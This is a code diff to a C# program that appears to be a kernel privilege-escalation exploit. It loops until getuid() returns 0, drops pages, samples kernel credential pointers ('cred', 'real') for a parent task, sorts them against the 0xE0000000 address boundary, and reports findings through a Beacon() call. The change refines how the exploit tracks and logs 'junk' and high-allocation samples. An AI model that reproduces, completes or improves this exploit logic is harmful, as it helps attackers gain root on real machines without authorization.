@@ -1186,7 +1186,10 @@ internal static class Program
                     // normal retry/scan path.
                     bool sawLow = false, highAlloc = false;
                     uint highParent = 0, highCred = 0, highReal = 0;
+                    // latch the FIRST junk sample: later zero reads must not
+                    // erase the evidence of which words were junk
                     bool highJunk = false;
+                    uint junkCred = 0, junkReal = 0;
                     for (int pr = 0; pr < 8 && getuid() != 0; pr++)
                     {
                         DropPages();
@@ -1224,15 +1227,21 @@ internal static class Program
                                 // that used to veto the gate via sawLow
                                 highCred = cred;
                                 highReal = real;
-                                if ((Kptr(cred) && cred < 0xE0000000) ||
-                                    (Kptr(real) && real < 0xE0000000))
+                                if (!highJunk &&
+                                    ((Kptr(cred) && cred < 0xE0000000) ||
+                                     (Kptr(real) && real < 0xE0000000)))
+                                {
                                     highJunk = true;
+                                    junkCred = cred;
+                                    junkReal = real;
+                                }
                             }
                             if (!parentHigh && Kptr(cred))
                             {
                                 if (cred >= 0xE0000000)
                                 {
-                                    highAlloc = true; highCred = cred; highReal = real;
+                                    highAlloc = true; highParent = parent;
+                                    highCred = cred; highReal = real;
                                 }
                                 else sawLow = true;
                             }
@@ -1240,7 +1249,8 @@ internal static class Program
                             {
                                 if (real >= 0xE0000000)
                                 {
-                                    highAlloc = true; highReal = real;
+                                    highAlloc = true; highParent = parent;
+                                    highReal = real;
                                     if (highCred == 0) highCred = cred;
                                 }
                                 else sawLow = true;
@@ -1312,9 +1322,11 @@ internal static class Program
                     // re-roll.  Only fast mode: long mode must not loop exits.
                     if (highAlloc && !sawLow && fastMode && getuid() != 0)
                     {
+                        uint logCred = highJunk ? junkCred : highCred;
+                        uint logReal = highJunk ? junkReal : highReal;
                         Beacon("high-alloc parent=" + highParent.ToString("x8") +
-                               " cred=" + highCred.ToString("x8") +
-                               " real=" + highReal.ToString("x8") +
+                               " cred=" + logCred.ToString("x8") +
+                               " real=" + logReal.ToString("x8") +
                                " junk=" + (highJunk ? 1 : 0) + " fast-exit");
                         break;
                     }
